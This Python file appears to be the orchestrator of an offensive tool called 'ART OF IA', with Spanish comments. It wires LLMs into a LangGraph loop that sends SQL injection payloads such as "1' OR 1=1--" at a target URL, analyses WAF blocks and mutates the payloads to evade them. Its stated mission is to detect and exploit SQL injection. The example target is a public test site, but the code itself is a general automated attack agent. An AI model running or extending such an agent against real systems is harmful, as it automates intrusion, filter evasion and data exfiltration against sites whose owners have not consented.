import os
import asyncio
from typing import TypedDict, List, Dict, Any
from langgraph.graph import StateGraph, END

# Importaciones de los módulos actualizados en la Fase 1
from dual_llm_pattern import PrivilegedLLM, QuarantineLLM, SymbolicController
from reflector import Reflector
# Nota: Asegúrate de que mutators.py y planner.py existan en tu repositorio
try:
    from mutators import arsenal 
    from planner import Planner
    from sniper import Sniper
except ImportError as e:
    print(f"[!] Warning: Algunos módulos auxiliares no encontrados ({e}).")
    print("El grafo se construirá, pero los nodos de Sniper/Planner podrían fallar si no existen.")

# --- ESQUEMA DE ESTADO "BEAST MODE" ---
class AgentState(TypedDict):
    # Misión y Target
    mission: str
    target_url: str
    
    # Payload y Vulnerabilidad
    current_payload: str
    vuln_type: str  # 'SQLI', 'LFI', 'XSS'
    
    # Control de Flujo
    iteration: int
    status: str # 'starting', 'success', 'blocked', 'failed'
    
    # Datos de Análisis (Para el Reflector y el Cerebro)
    exfiltrated_data: str
    last_response_metadata: Dict[str, Any] # Aquí viaja el simplified_content y delta_t
    waf_metadata: Dict[str, Any] # Info recuperada por QuarantineLLM
    failed_attempts_summary: List[Dict[str, Any]] 
    
    # Mapa Simbólico (Para tracking de tokens)
    symbolic_map: List[str]

class ArtOfIAOrchestrator:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.max_iterations = 20
        
        # 1. El Corazón del Aislamiento: Controlador Simbólico Único
        # Este objeto es compartido por L1 y L2 para mantener el Vault de datos.
        self.controller = SymbolicController()
        
        # 2. Instancias de LLMs (Dual-LLM Pattern)
        self.quarantine = QuarantineLLM(self.controller)
        self.brain = PrivilegedLLM(self.controller)
        
        # 3. Nodos de Ejecución y Juicio
        self.reflector = Reflector(target_url=target_url)
        
        # Módulos de soporte (Assuming these are implemented as classes/objects)
        try:
            self.planner = Planner() 
            self.sniper = Sniper()
        except:
            self.planner = None
            self.sniper = None

    async def planner_node(self, state: AgentState):
        """Coordinador de estrategia inicial."""
        print(f"\n[*] [PLANNER] Iteración {state.get('iteration', 0)}. Analizando misión...")
        
        if self.planner:
            result = await self.planner.execute(state)
        else:
            # Fallback si no hay planner.py: Definir un payload base
            result = {"current_payload": "1' OR 1=1--", "vuln_type": "SQLI"}
            
        return {
            **result, 
            "iteration": state.get("iteration", 0) + 1
        }

    async def quarantine_node(self, state: AgentState):
        """L1: Analiza la respuesta hostil y simboliza las entidades."""
        print("[*] [QUARANTINE] Ejecutando aislamiento simbólico (L1)...")
        
        # Obtenemos la última respuesta del reflector
        raw_response = state.get("last_response_metadata", {}).get("last_content", "")
        if not raw_response:
            # Si no hay contenido, usamos la URL como input inicial
            raw_response = f"Target URL: {state['target_url']}"

        # L1 extrae, clasifica y simboliza
        symbolic_findings = await self.quarantine.parse_and_symbolize(raw_response)
        
        # Actualizamos la metadata del WAF y el mapa de tokens
        return {
            "waf_metadata": {
                "block_detected": symbolic_findings.get("waf_block_detected", False),
                "status_code": symbolic_findings.get("status_code"),
                "detected_tech": symbolic_findings.get("technologies", [])
            },
            "symbolic_map": symbolic_findings.get("parameters", []),
            "status": "analyzed"
        }

    async def sniper_node(self, state: AgentState):
        """El Ejecutor: Consulta al Cerebro (L2) y muta el payload."""
        print(f"[*] [SNIPER] Consultando estrategia de evasión para {state.get('vuln_type', 'SQLI')}...")
        
        # 1. El Cerebro decide la estrategia basada en RAG y Tokens Tipados
        strategy = await self.brain.decide_strategy(state) 
        
        # 2. Mutación del payload usando el Arsenal
        try:
            # Usamos el arsenal para aplicar la mutación elegida por el cerebro
            mutated_payload = arsenal.mutate(
                payload=state["current_payload"], 
                vuln_type=state.get("vuln_type", "SQLI"), 
                strategy=strategy
            )
            print(f"[+] [SNIPER] Mutación aplicada: {strategy}")
        except Exception as e:
            print(f"[-] Error en mutación: {e}")
            mutated_payload = state["current_payload"] # Fallback
        
        return {"current_payload": mutated_payload}

    async def reflector_node(self, state: AgentState):
        """El Juez: Ejecuta el payload y analiza la respuesta (Skeletal DOM & Delta T)."""
        result = await self.reflector.execute(state)
        return result

    def build_graph(self):
        """Construcción del Grafo de Estado de LangGraph."""
        workflow = StateGraph(AgentState)
        
        # Añadir nodos
        workflow.add_node("planner", self.planner_node)
        workflow.add_node("quarantine", self.quarantine_node)
        workflow.add_node("sniper", self.sniper_node)
        workflow.add_node("reflector", self.reflector_node)

        # Flujo de ejecución
        workflow.set_entry_point("planner")
        workflow.add_edge("planner", "reflector")
        
        # Ruteo Condicional: 
        # Si el Reflector detecta 'success' -> FIN
        # Si detecta 'blocked' o 'failed' -> QUARANTINE para analizar el WAF
        workflow.add_conditional_edges(
            "reflector",
            lambda x: x["status"],
            {
                "success": END,
                "blocked": "quarantine",
                "failed": "quarantine",
                "analyzed": "sniper" # Caso interno
            }
        )
        
        workflow.add_edge("quarantine", "sniper")
        workflow.add_edge("sniper", "reflector")

        return workflow.compile()

async def main():
    # Configuración del Target
    target = "http://testphp.vulnweb.com" # Ejemplo de target
    orchestrator = ArtOfIAOrchestrator(target_url=target)
    app = orchestrator.build_graph()
    
    print("\n" + "="*60)
    print(" ART OF IA v3.0 - BEAST MODE: PHASE 1 IMPLEMENTED ")
    print(" [Simbólico Tipado] | [Skeletal DOM Diff] | [Delta T Analysis] ")
    print("="*60 + "\n")
    
    # Estado inicial optimizado para la Fase 1
    initial_state = {
        "mission": "Detectar y explotar SQL Injection",
        "target_url": target,
        "current_payload": "1' AND (SELECT 1)=1--", 
        "vuln_type": "SQLI", 
        "exfiltrated_data": "",
        "iteration": 0,
        "status": "starting",
        "failed_attempts_summary": [],
        "last_response_metadata": {},
        "waf_metadata": {},
        "symbolic_map": []
    }
    
    try:
        async for output in app.astream(initial_state):
            # El estado se actualiza automáticamente en el grafo
            pass
    except Exception as e:
        print(f"[!] Error en el ciclo de ejecución: {e}")

if __name__ == "__main__":
    asyncio.run(main())
